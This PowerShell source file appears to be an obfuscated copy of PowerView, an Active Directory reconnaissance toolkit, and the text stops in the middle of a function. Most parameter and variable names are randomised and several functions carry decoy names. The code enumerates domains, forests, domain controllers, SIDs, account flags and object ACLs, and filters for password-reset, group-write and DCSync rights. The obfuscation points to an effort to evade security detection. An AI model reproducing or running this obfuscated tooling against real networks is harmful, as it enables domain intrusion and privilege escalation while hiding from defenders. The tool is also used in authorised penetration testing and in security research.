filter Export-PowerViewCSV {
    Param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [System.Management.Automation.PSObject[]]
        $xgeUKRWZ99,
        [Parameter(Mandatory=$True, Position=0)]
        [String]
        [ValidateNotNullOrEmpty()]
        $DNPsAXix99
    )
    $sKrlqllN99 = $xgeUKRWZ99 | ConvertTo-Csv -NoTypeInformation
    $Mutex = New-Object System.Threading.Mutex $False,'CSVMutex';
    $Null = $Mutex.WaitOne()
    if (Test-Path -Path $DNPsAXix99) {
        $sKrlqllN99 | ForEach-Object { $Start=$True }{ if ($Start) {$Start=$False} else {$_} } | Out-File -Encoding 'ASCII' -Append -FilePath $DNPsAXix99
    }
    else {
        $sKrlqllN99 | Out-File -Encoding 'ASCII' -Append -FilePath $DNPsAXix99
    }
    $Mutex.ReleaseMutex()
}
filter Convert-SidToName {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        [ValidatePattern('^S-1-.*')]
        $SID
    )
    try {
        $SID2 = $SID.trim('*')
        Switch ($SID2)
        {
            'S-1-0'         { 'Null Authority' }
            'S-1-0-0'       { 'Nobody' }
            'S-1-1'         { 'World Authority' }
            'S-1-1-0'       { 'Everyone' }
            'S-1-2'         { 'Local Authority' }
            'S-1-2-0'       { 'Local' }
            'S-1-2-1'       { 'Console Logon ' }
            'S-1-3'         { 'Creator Authority' }
            'S-1-3-0'       { 'Creator Owner' }
            'S-1-3-1'       { 'Creator Group' }
            'S-1-3-2'       { 'Creator Owner Server' }
            'S-1-3-3'       { 'Creator Group Server' }
            'S-1-3-4'       { 'Owner Rights' }
            'S-1-4'         { 'Non-unique Authority' }
            'S-1-5'         { 'NT Authority' }
            'S-1-5-1'       { 'Dialup' }
            'S-1-5-2'       { 'Network' }
            'S-1-5-3'       { 'Batch' }
            'S-1-5-4'       { 'Interactive' }
            'S-1-5-6'       { 'Service' }
            'S-1-5-7'       { 'Anonymous' }
            'S-1-5-8'       { 'Proxy' }
            'S-1-5-9'       { 'Enterprise Domain Controllers' }
            'S-1-5-10'      { 'Principal Self' }
            'S-1-5-11'      { 'Authenticated Users' }
            'S-1-5-12'      { 'Restricted Code' }
            'S-1-5-13'      { 'Terminal Server Users' }
            'S-1-5-14'      { 'Remote Interactive Logon' }
            'S-1-5-15'      { 'This Organization ' }
            'S-1-5-17'      { 'This Organization ' }
            'S-1-5-18'      { 'Local System' }
            'S-1-5-19'      { 'NT Authority' }
            'S-1-5-20'      { 'NT Authority' }
            'S-1-5-80-0'    { 'All Services ' }
            'S-1-5-32-544'  { 'BUILTIN\Administrators' }
            'S-1-5-32-545'  { 'BUILTIN\Users' }
            'S-1-5-32-546'  { 'BUILTIN\Guests' }
            'S-1-5-32-547'  { 'BUILTIN\Power Users' }
            'S-1-5-32-548'  { 'BUILTIN\Account Operators' }
            'S-1-5-32-549'  { 'BUILTIN\Server Operators' }
            'S-1-5-32-550'  { 'BUILTIN\Print Operators' }
            'S-1-5-32-551'  { 'BUILTIN\Backup Operators' }
            'S-1-5-32-552'  { 'BUILTIN\Replicators' }
            'S-1-5-32-554'  { 'BUILTIN\Pre-Windows 2000 Compatible Access' }
            'S-1-5-32-555'  { 'BUILTIN\Remote Desktop Users' }
            'S-1-5-32-556'  { 'BUILTIN\Network Configuration Operators' }
            'S-1-5-32-557'  { 'BUILTIN\Incoming Forest Trust Builders' }
            'S-1-5-32-558'  { 'BUILTIN\Performance Monitor Users' }
            'S-1-5-32-559'  { 'BUILTIN\Performance Log Users' }
            'S-1-5-32-560'  { 'BUILTIN\Windows Authorization Access Group' }
            'S-1-5-32-561'  { 'BUILTIN\Terminal Server License Servers' }
            'S-1-5-32-562'  { 'BUILTIN\Distributed COM Users' }
            'S-1-5-32-569'  { 'BUILTIN\Cryptographic Operators' }
            'S-1-5-32-573'  { 'BUILTIN\Event Log Readers' }
            'S-1-5-32-574'  { 'BUILTIN\Certificate Service DCOM Access' }
            'S-1-5-32-575'  { 'BUILTIN\RDS Remote Access Servers' }
            'S-1-5-32-576'  { 'BUILTIN\RDS Endpoint Servers' }
            'S-1-5-32-577'  { 'BUILTIN\RDS Management Servers' }
            'S-1-5-32-578'  { 'BUILTIN\Hyper-V Administrators' }
            'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }
            'S-1-5-32-580'  { 'BUILTIN\Access Control Assistance Operators' }
            Default { 
                $Obj = (New-Object System.Security.Principal.SecurityIdentifier($SID2))
                $Obj.Translate( [System.Security.Principal.NTAccount]).Value
            }
        }
    }
    catch {
        Write-Debug "Invalid SID: $SID"
        $SID
    }
}
filter Convert-ADName {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        $DMIsyyUk99,
        [String]
        [ValidateSet("NT4","Simple","Canonical")]
        $yVinXyqh99,
        [String]
        [ValidateSet("NT4","Simple","Canonical")]
        $SlJLZnNF99
    )
    $HhsohNcH99 = @{
        "Canonical" = 2
        "NT4"       = 3
        "Simple"    = 5
    }
    if(!$PSBoundParameters['InputType']) {
        if( ($DMIsyyUk99.split('/')).Count -eq 2 ) {
            $DMIsyyUk99 = $DMIsyyUk99.replace('/', '\')
        }
        if($DMIsyyUk99 -match "^[A-Za-z]+\\[A-Za-z ]+$") {
            $yVinXyqh99 = 'NT4'
        }
        elseif($DMIsyyUk99 -match "^[A-Za-z ]+@[A-Za-z\.]+") {
            $yVinXyqh99 = 'Simple'
        }
        elseif($DMIsyyUk99 -match "^[A-Za-z\.]+/[A-Za-z]+/[A-Za-z/ ]+") {
            $yVinXyqh99 = 'Canonical'
        }
        else {
            Write-Warning "Can not identify InType for $DMIsyyUk99"
            return $DMIsyyUk99
        }
    }
    elseif($yVinXyqh99 -eq 'NT4') {
        $DMIsyyUk99 = $DMIsyyUk99.replace('/', '\')
    }
    if(!$PSBoundParameters['OutputType']) {
        $SlJLZnNF99 = Switch($yVinXyqh99) {
            'NT4' {'Canonical'}
            'Simple' {'NT4'}
            'Canonical' {'NT4'}
        }
    }
    $bSMYmVPO99 = Switch($yVinXyqh99) {
        'NT4' { $DMIsyyUk99.split("\")[0] }
        'Simple' { $DMIsyyUk99.split("@")[1] }
        'Canonical' { $DMIsyyUk99.split("/")[0] }
    }
    function Invoke-Method([__ComObject] $Object, [String] $oAmkrDnc99, $hvHqeTGU99) {
        $JnEKtIwn99 = $Object.GetType().InvokeMember($oAmkrDnc99, "InvokeMethod", $Null, $Object, $hvHqeTGU99)
        if ( $JnEKtIwn99 ) { $JnEKtIwn99 }
    }
    function Set-Property([__ComObject] $Object, [String] $MFgEzPmZ99, $hvHqeTGU99) {
        [Void] $Object.GetType().InvokeMember($MFgEzPmZ99, "SetProperty", $Null, $Object, $hvHqeTGU99)
    }
    $uXerbOBi99 = New-Object -ComObject NameTranslate
    try {
        Invoke-Method $uXerbOBi99 "Init" (1, $bSMYmVPO99)
    }
    catch [System.Management.Automation.MethodInvocationException] { 
        Write-Debug "Error with translate init in Convert-ADName: $_"
    }
    Set-Property $uXerbOBi99 "ChaseReferral" (0x60)
    try {
        Invoke-Method $uXerbOBi99 "Set" ($HhsohNcH99[$yVinXyqh99], $DMIsyyUk99)
        (Invoke-Method $uXerbOBi99 "Get" ($HhsohNcH99[$SlJLZnNF99]))
    }
    catch [System.Management.Automation.MethodInvocationException] {
        Write-Debug "Error with translate Set/Get in Convert-ADName: $_"
    }
}
function remounting {
    
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        $Value,
        [Switch]
        $Pwcxznds99
    )
    begin {
        $aMJeVmuD99 = New-Object System.Collections.Specialized.OrderedDictionary
        $aMJeVmuD99.Add("SCRIPT", 1)
        $aMJeVmuD99.Add("ACCOUNTDISABLE", 2)
        $aMJeVmuD99.Add("HOMEDIR_REQUIRED", 8)
        $aMJeVmuD99.Add("LOCKOUT", 16)
        $aMJeVmuD99.Add("PASSWD_NOTREQD", 32)
        $aMJeVmuD99.Add("PASSWD_CANT_CHANGE", 64)
        $aMJeVmuD99.Add("ENCRYPTED_TEXT_PWD_ALLOWED", 128)
        $aMJeVmuD99.Add("TEMP_DUPLICATE_ACCOUNT", 256)
        $aMJeVmuD99.Add("NORMAL_ACCOUNT", 512)
        $aMJeVmuD99.Add("INTERDOMAIN_TRUST_ACCOUNT", 2048)
        $aMJeVmuD99.Add("WORKSTATION_TRUST_ACCOUNT", 4096)
        $aMJeVmuD99.Add("SERVER_TRUST_ACCOUNT", 8192)
        $aMJeVmuD99.Add("DONT_EXPIRE_PASSWORD", 65536)
        $aMJeVmuD99.Add("MNS_LOGON_ACCOUNT", 131072)
        $aMJeVmuD99.Add("SMARTCARD_REQUIRED", 262144)
        $aMJeVmuD99.Add("TRUSTED_FOR_DELEGATION", 524288)
        $aMJeVmuD99.Add("NOT_DELEGATED", 1048576)
        $aMJeVmuD99.Add("USE_DES_KEY_ONLY", 2097152)
        $aMJeVmuD99.Add("DONT_REQ_PREAUTH", 4194304)
        $aMJeVmuD99.Add("PASSWORD_EXPIRED", 8388608)
        $aMJeVmuD99.Add("TRUSTED_TO_AUTH_FOR_DELEGATION", 16777216)
        $aMJeVmuD99.Add("PARTIAL_SECRETS_ACCOUNT", 67108864)
    }
    process {
        $TWpBsYKX99 = New-Object System.Collections.Specialized.OrderedDictionary
        if($Value -is [Int]) {
            $PEuDxkLZ99 = $Value
        }
        elseif ($Value -is [PSCustomObject]) {
            if($Value.useraccountcontrol) {
                $PEuDxkLZ99 = $Value.useraccountcontrol
            }
        }
        else {
            Write-Warning "Invalid object input for -Value : $Value"
            return $Null 
        }
        if($Pwcxznds99) {
            foreach ($oJvtimiG99 in $aMJeVmuD99.GetEnumerator()) {
                if( ($PEuDxkLZ99 -band $oJvtimiG99.Value) -eq $oJvtimiG99.Value) {
                    $TWpBsYKX99.Add($oJvtimiG99.Name, "$($oJvtimiG99.Value)+")
                }
                else {
                    $TWpBsYKX99.Add($oJvtimiG99.Name, "$($oJvtimiG99.Value)")
                }
            }
        }
        else {
            foreach ($oJvtimiG99 in $aMJeVmuD99.GetEnumerator()) {
                if( ($PEuDxkLZ99 -band $oJvtimiG99.Value) -eq $oJvtimiG99.Value) {
                    $TWpBsYKX99.Add($oJvtimiG99.Name, "$($oJvtimiG99.Value)")
                }
            }
        }
        $TWpBsYKX99
    }
}
filter Get-Proxy {
    param(
        [Parameter(ValueFromPipeline=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ztduaZgG99 = $ENV:COMPUTERNAME
    )
    try {
        $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('CurrentUser', $ztduaZgG99)
        $FiJxAjnT99 = $Reg.OpenSubkey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings")
        $QzQSUfrt99 = $FiJxAjnT99.GetValue('ProxyServer')
        $lqpfqify99 = $FiJxAjnT99.GetValue('AutoConfigURL')
        $Wpad = ""
        if($lqpfqify99 -and ($lqpfqify99 -ne "")) {
            try {
                $Wpad = (New-Object Net.Webclient).DownloadString($lqpfqify99)
            }
            catch {
                Write-Warning "Error connecting to AutoConfigURL : $lqpfqify99"
            }
        }
        
        if($QzQSUfrt99 -or $lqpfqify99) {
            $jJhdUgEl99 = @{
                'ProxyServer' = $QzQSUfrt99
                'AutoConfigURL' = $lqpfqify99
                'Wpad' = $Wpad
            }
            
            New-Object -TypeName PSObject -Property $jJhdUgEl99
        }
        else {
            Write-Warning "No proxy settings found for $ztduaZgG99"
        }
    }
    catch {
        Write-Warning "Error enumerating proxy settings for $ztduaZgG99 : $_"
    }
}
function fuss {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        $Path,
        [Switch]
        $qYWdisPM99
    )
    begin {
        function sims {
            [CmdletBinding()]
            param(
                [Int]
                $FSR
            )
            $AccessMask = @{
              [uint32]'0x80000000' = 'GenericRead'
              [uint32]'0x40000000' = 'GenericWrite'
              [uint32]'0x20000000' = 'GenericExecute'
              [uint32]'0x10000000' = 'GenericAll'
              [uint32]'0x02000000' = 'MaximumAllowed'
              [uint32]'0x01000000' = 'AccessSystemSecurity'
              [uint32]'0x00100000' = 'Synchronize'
              [uint32]'0x00080000' = 'WriteOwner'
              [uint32]'0x00040000' = 'WriteDAC'
              [uint32]'0x00020000' = 'ReadControl'
              [uint32]'0x00010000' = 'Delete'
              [uint32]'0x00000100' = 'WriteAttributes'
              [uint32]'0x00000080' = 'ReadAttributes'
              [uint32]'0x00000040' = 'DeleteChild'
              [uint32]'0x00000020' = 'Execute/Traverse'
              [uint32]'0x00000010' = 'WriteExtendedAttributes'
              [uint32]'0x00000008' = 'ReadExtendedAttributes'
              [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
              [uint32]'0x00000002' = 'WriteData/AddFile'
              [uint32]'0x00000001' = 'ReadData/ListDirectory'
            }
            $RLpXvCyR99 = @{
              [uint32]'0x1f01ff' = 'FullControl'
              [uint32]'0x0301bf' = 'Modify'
              [uint32]'0x0200a9' = 'ReadAndExecute'
              [uint32]'0x02019f' = 'ReadAndWrite'
              [uint32]'0x020089' = 'Read'
              [uint32]'0x000116' = 'Write'
            }
            $BKaSWKSH99 = @()
            $BKaSWKSH99 += $RLpXvCyR99.Keys |  % {
                              if (($FSR -band $_) -eq $_) {
                                $RLpXvCyR99[$_]
                                $FSR = $FSR -band (-not $_)
                              }
                            }
            $BKaSWKSH99 += $AccessMask.Keys |
                            ? { $FSR -band $_ } |
                            % { $AccessMask[$_] }
            ($BKaSWKSH99 | ?{$_}) -join ","
        }
    }
    process {
        try {
            $ACL = Get-Acl -Path $Path
            $ACL.GetAccessRules($true,$true,[System.Security.Principal.SecurityIdentifier]) | ForEach-Object {
                $Names = @()
                if ($_.IdentityReference -match '^S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+') {
                    $Object = Get-ADObject -SID $_.IdentityReference
                    $Names = @()
                    $SIDs = @($Object.objectsid)
                    if ($qYWdisPM99 -and (@('268435456','268435457','536870912','536870913') -contains $Object.samAccountType)) {
                        $SIDs += kumquats -SID $Object.objectsid | Select-Object -ExpandProperty MemberSid
                    }
                    $SIDs | ForEach-Object {
                        $Names += ,@($_, (Convert-SidToName $_))
                    }
                }
                else {
                    $Names += ,@($_.IdentityReference.Value, (Convert-SidToName $_.IdentityReference.Value))
                }
                ForEach($Name in $Names) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'Path' $Path
                    $Out | Add-Member Noteproperty 'FileSystemRights' (sims -FSR $_.FileSystemRights.value__)
                    $Out | Add-Member Noteproperty 'IdentityReference' $Name[1]
                    $Out | Add-Member Noteproperty 'IdentitySID' $Name[0]
                    $Out | Add-Member Noteproperty 'AccessControlType' $_.AccessControlType
                    $Out
                }
            }
        }
        catch {
            Write-Warning $_
        }
    }
}
filter Get-NameField {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Object]
        $Object,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [String]
        $fMtldDPA99,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [String]
        $Name
    )
    if($PSBoundParameters['DnsHostName']) {
        $fMtldDPA99
    }
    elseif($PSBoundParameters['Name']) {
        $Name
    }
    elseif($Object) {
        if ( [bool]($Object.PSobject.Properties.name -match "dnshostname") ) {
            $Object.dnshostname
        }
        elseif ( [bool]($Object.PSobject.Properties.name -match "name") ) {
            $Object.name
        }
        else {
            $Object
        }
    }
    else {
        return $Null
    }
}
function vanquishing {
    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [ValidateNotNullOrEmpty()]
        $jJhdUgEl99
    )
    $HZbUJJOC99 = @{}
    $jJhdUgEl99.PropertyNames | ForEach-Object {
        if (($_ -eq "objectsid") -or ($_ -eq "sidhistory")) {
            $HZbUJJOC99[$_] = (New-Object System.Security.Principal.SecurityIdentifier($jJhdUgEl99[$_][0],0)).Value
        }
        elseif($_ -eq "objectguid") {
            $HZbUJJOC99[$_] = (New-Object Guid (,$jJhdUgEl99[$_][0])).Guid
        }
        elseif( ($_ -eq "lastlogon") -or ($_ -eq "lastlogontimestamp") -or ($_ -eq "pwdlastset") -or ($_ -eq "lastlogoff") -or ($_ -eq "badPasswordTime") ) {
            if ($jJhdUgEl99[$_][0] -is [System.MarshalByRefObject]) {
                $Temp = $jJhdUgEl99[$_][0]
                [Int32]$High = $Temp.GetType().InvokeMember("HighPart", [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                [Int32]$Low  = $Temp.GetType().InvokeMember("LowPart",  [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                $HZbUJJOC99[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
            }
            else {
                $HZbUJJOC99[$_] = ([datetime]::FromFileTime(($jJhdUgEl99[$_][0])))
            }
        }
        elseif($jJhdUgEl99[$_][0] -is [System.MarshalByRefObject]) {
            $Prop = $jJhdUgEl99[$_]
            try {
                $Temp = $Prop[$_][0]
                Write-Verbose $_
                [Int32]$High = $Temp.GetType().InvokeMember("HighPart", [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                [Int32]$Low  = $Temp.GetType().InvokeMember("LowPart",  [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                $HZbUJJOC99[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
            }
            catch {
                $HZbUJJOC99[$_] = $Prop[$_]
            }
        }
        elseif($jJhdUgEl99[$_].count -eq 1) {
            $HZbUJJOC99[$_] = $jJhdUgEl99[$_][0]
        }
        else {
            $HZbUJJOC99[$_] = $jJhdUgEl99[$_]
        }
    }
    New-Object -TypeName PSObject -Property $HZbUJJOC99
}
filter Get-DomainSearcher {
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $bSMYmVPO99,
        [String]
        $QZblrLyX99,
        [String]
        $pwaAKbSS99,
        [String]
        $HYMRBpEt99,
        [ValidateRange(1,10000)] 
        [Int]
        $ZkOZzcfr99 = 200,
        [Management.Automation.PSCredential]
        $btmlSobu99
    )
    if(!$btmlSobu99) {
        if(!$bSMYmVPO99){
            $bSMYmVPO99 = (Get-NetDomain).name
        }
        elseif(!$QZblrLyX99) {
            try {
                $QZblrLyX99 = ((Get-NetDomain).PdcRoleOwner).Name
            }
            catch {
                throw "Get-DomainSearcher: Error in retrieving PDC for current domain"
            }
        }
    }
    elseif (!$QZblrLyX99) {
        try {
            $QZblrLyX99 = ((Get-NetDomain -btmlSobu99 $btmlSobu99).PdcRoleOwner).Name
        }
        catch {
            throw "Get-DomainSearcher: Error in retrieving PDC for current domain"
        }
        if(!$QZblrLyX99) {
            throw "Get-DomainSearcher: Error in retrieving PDC for current domain"
        }
    }
    $AbIrUYkv99 = "LDAP://"
    if($QZblrLyX99) {
        $AbIrUYkv99 += $QZblrLyX99
        if($bSMYmVPO99){
            $AbIrUYkv99 += "/"
        }
    }
    if($HYMRBpEt99) {
        $AbIrUYkv99 += $HYMRBpEt99 + ","
    }
    if($pwaAKbSS99) {
        if($pwaAKbSS99 -like "GC://*") {
            $DN = $pwaAKbSS99
            $AbIrUYkv99 = ""
        }
        else {
            if($pwaAKbSS99 -like "LDAP://*") {
                if($pwaAKbSS99 -match "LDAP://.+/.+") {
                    $AbIrUYkv99 = ""
                }
                else {
                    $pwaAKbSS99 = $pwaAKbSS99.Substring(7)
                }
            }
            $DN = $pwaAKbSS99
        }
    }
    else {
        if($bSMYmVPO99 -and ($bSMYmVPO99.Trim() -ne "")) {
            $DN = "DC=$($bSMYmVPO99.Replace('.', ',DC='))"
        }
    }
    $AbIrUYkv99 += $DN
    Write-Verbose "Get-DomainSearcher search string: $AbIrUYkv99"
    if($btmlSobu99) {
        Write-Verbose "Using alternate credentials for LDAP connection"
        $eStRxbrz99 = New-Object DirectoryServices.DirectoryEntry($AbIrUYkv99, $btmlSobu99.UserName, $btmlSobu99.GetNetworkCredential().Password)
        $cqsvooMu99 = New-Object System.DirectoryServices.DirectorySearcher($eStRxbrz99)
    }
    else {
        $cqsvooMu99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$AbIrUYkv99)
    }
    $cqsvooMu99.PageSize = $ZkOZzcfr99
    $cqsvooMu99
}
filter Get-NetDomain {
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $bSMYmVPO99,
        [Management.Automation.PSCredential]
        $btmlSobu99
    )
    if($btmlSobu99) {
        
        Write-Verbose "Using alternate credentials for Get-NetDomain"
        if(!$bSMYmVPO99) {
            $bSMYmVPO99 = $btmlSobu99.GetNetworkCredential().Domain
            Write-Verbose "Extracted domain '$bSMYmVPO99' from -btmlSobu99"
        }
   
        $aUGWyQPR99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $bSMYmVPO99, $btmlSobu99.UserName, $btmlSobu99.GetNetworkCredential().Password)
        
        try {
            [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($aUGWyQPR99)
        }
        catch {
            Write-Warning "The specified domain does '$bSMYmVPO99' not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid."
            $Null
        }
    }
    elseif($bSMYmVPO99) {
        $aUGWyQPR99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $bSMYmVPO99)
        try {
            [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($aUGWyQPR99)
        }
        catch {
            Write-Warning "The specified domain '$bSMYmVPO99' does not exist, could not be contacted, or there isn't an existing trust."
            $Null
        }
    }
    else {
        [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    }
}
filter Get-NetForest {
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $DPsPizIF99,
        [Management.Automation.PSCredential]
        $btmlSobu99
    )
    if($btmlSobu99) {
        
        Write-Verbose "Using alternate credentials for Get-NetForest"
        if(!$DPsPizIF99) {
            $DPsPizIF99 = $btmlSobu99.GetNetworkCredential().Domain
            Write-Verbose "Extracted domain '$DPsPizIF99' from -btmlSobu99"
        }
   
        $hNjKlwiu99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $DPsPizIF99, $btmlSobu99.UserName, $btmlSobu99.GetNetworkCredential().Password)
        
        try {
            $nLIQbxDu99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($hNjKlwiu99)
        }
        catch {
            Write-Warning "The specified forest '$DPsPizIF99' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid."
            $Null
        }
    }
    elseif($DPsPizIF99) {
        $hNjKlwiu99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $DPsPizIF99)
        try {
            $nLIQbxDu99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($hNjKlwiu99)
        }
        catch {
            Write-Warning "The specified forest '$DPsPizIF99' does not exist, could not be contacted, or there isn't an existing trust."
            return $Null
        }
    }
    else {
        $nLIQbxDu99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    }
    if($nLIQbxDu99) {
        try {
            $xiYTPugx99 = (New-Object System.Security.Principal.NTAccount($nLIQbxDu99.RootDomain,"krbtgt")).Translate([System.Security.Principal.SecurityIdentifier]).Value
            $Parts = $xiYTPugx99 -Split "-"
            $xiYTPugx99 = $Parts[0..$($Parts.length-2)] -join "-"
            $nLIQbxDu99 | Add-Member NoteProperty 'RootDomainSid' $xiYTPugx99
        }
        catch {
            Write-Verbose "Couldn't translate SID for Forest"
            $xiYTPugx99 = ""
        }
        $nLIQbxDu99
    }
}
filter Get-NetForestDomain {
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $DPsPizIF99,
        [Management.Automation.PSCredential]
        $btmlSobu99
    )
    $nLIQbxDu99 = Get-NetForest -DPsPizIF99 $DPsPizIF99 -btmlSobu99 $btmlSobu99
    if($nLIQbxDu99) {
        $nLIQbxDu99.Domains
    }
}
filter Get-NetForestCatalog {
    
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $DPsPizIF99,
        [Management.Automation.PSCredential]
        $btmlSobu99
    )
    $nLIQbxDu99 = Get-NetForest -DPsPizIF99 $DPsPizIF99 -btmlSobu99 $btmlSobu99
    if($nLIQbxDu99) {
        $nLIQbxDu99.FindAllGlobalCatalogs()
    }
}
filter Get-NetDomainController {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $bSMYmVPO99,
        [String]
        $QZblrLyX99,
        [Switch]
        $LDAP,
        [Management.Automation.PSCredential]
        $btmlSobu99
    )
    if($LDAP -or $QZblrLyX99) {
        electrocardiogram -bSMYmVPO99 $bSMYmVPO99 -QZblrLyX99 $QZblrLyX99 -btmlSobu99 $btmlSobu99 -hufPnAJz99 -vhlJrvVc99 '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
    }
    else {
        $jOPmnJkr99 = Get-NetDomain -bSMYmVPO99 $bSMYmVPO99 -btmlSobu99 $btmlSobu99
        if($jOPmnJkr99) {
            $jOPmnJkr99.DomainControllers
        }
    }
}
function Sufism {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $niDFhyzI99,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $Name = "*",
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $oKNkcKUd99 = "*",
        [Switch]
        $SdOIyelb99,
        [String]
        $vhlJrvVc99,
        [String]
        $pwaAKbSS99,
        [String]
        $HYMRBpEt99,
        [String]
        [ValidateSet("All","ResetPassword","WriteMembers")]
        $RZkwIRUF99,
        [String]
        $bSMYmVPO99,
        [String]
        $QZblrLyX99,
        [ValidateRange(1,10000)] 
        [Int]
        $ZkOZzcfr99 = 200,
        [Management.Automation.PSCredential]
        $btmlSobu99
    )
    begin {
        $cqsvooMu99 = Get-DomainSearcher -bSMYmVPO99 $bSMYmVPO99 -QZblrLyX99 $QZblrLyX99 -pwaAKbSS99 $pwaAKbSS99 -HYMRBpEt99 $HYMRBpEt99 -ZkOZzcfr99 $ZkOZzcfr99 -btmlSobu99 $btmlSobu99
        if($SdOIyelb99) {
            $GUIDs = Get-GUIDMap -bSMYmVPO99 $bSMYmVPO99 -QZblrLyX99 $QZblrLyX99 -ZkOZzcfr99 $ZkOZzcfr99 -btmlSobu99 $btmlSobu99
        }
    }
    process {
        if ($cqsvooMu99) {
            if($niDFhyzI99) {
                $cqsvooMu99.filter="(&(samaccountname=$niDFhyzI99)(name=$Name)(distinguishedname=$oKNkcKUd99)$vhlJrvVc99)"  
            }
            else {
                $cqsvooMu99.filter="(&(name=$Name)(distinguishedname=$oKNkcKUd99)$vhlJrvVc99)"  
            }
  
            try {
                $NQVzBXmx99 = $cqsvooMu99.FindAll()
                
                $NQVzBXmx99 | Where-Object {$_} | ForEach-Object {
                    if($btmlSobu99) {
                        $Object = New-Object -TypeName System.DirectoryServices.DirectoryEntry($_.path, $($btmlSobu99.UserName),$($btmlSobu99.GetNetworkCredential().password))
                    }
                    else {
                        $Object = [adsi]($_.path)
                    }
                    
                    if($Object.distinguishedname) {
                        $NheOdQak99 = $Object.PsBase.ObjectSecurity.access
                        $NheOdQak99 | ForEach-Object {
                            $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
                            if($Object.objectsid[0]){
                                $S = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                            }
                            else {
                                $S = $Null
                            }
                            
                            $_ | Add-Member NoteProperty 'ObjectSID' $S
                            $_
                        }
                    }
                } | ForEach-Object {
                    if($RZkwIRUF99) {
                        $SzJDCGJE99 = Switch ($RZkwIRUF99) {
                            "ResetPassword" { "00299570-246d-11d0-a768-00aa006e0529" }
                            "WriteMembers" { "bf9679c0-0de6-11d0-a285-00aa003049e2" }
                            Default { "00000000-0000-0000-0000-000000000000"}
                        }
                        if($_.ObjectType -eq $SzJDCGJE99) { $_ }
                    }
                    else {
                        $_
                    }
                } | ForEach-Object {
                    if($GUIDs) {
                        $tWapcZOj99 = @{}
                        $_.psobject.properties | ForEach-Object {
                            if( ($_.Name -eq 'ObjectType') -or ($_.Name -eq 'InheritedObjectType') ) {
                                try {
                                    $tWapcZOj99[$_.Name] = $GUIDS[$_.Value.toString()]
                                }
                                catch {
                                    $tWapcZOj99[$_.Name] = $_.Value
                                }
                            }
                            else {
                                $tWapcZOj99[$_.Name] = $_.Value
                            }
                        }
                        New-Object -TypeName PSObject -Property $tWapcZOj99
                    }
                    else { $_ }
                }
                $NQVzBXmx99.dispose()
                $cqsvooMu99.dispose()
            }
            catch {
                Write-Warning $_
            }
        }
    }
}
function indirect {
    [CmdletBinding()]
    Param (
        [String]
        $ytEDRRfH99,
        [String]
        $ClgXBKAp99 = "*",
        [Alias('DN')]
        [String]
        $eSAAMxXN99 = "*",
        [String]
        $UoyeCNih99,
        [String]
        $MgwAvpzd99,
        [String]
        $TOnJEjRE99,
        [String]
        [ValidatePattern('^S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+')]
        $VPknkLjI99,
        [String]
        $DnbGaehy99,
        [String]
        $TdPERllW99,
        [String]
        [ValidateSet("All","ResetPassword","WriteMembers","DCSync")]
        $cIaYlOpY99 = "All",
        [String]
        $CMjugcxf99,
        [String]
        $bSMYmVPO99,
        [String]
        $QZblrLyX99,
        [ValidateRange(1,10000)] 
        [Int]
        $ZkOZzcfr99 = 200
    )
    begin {
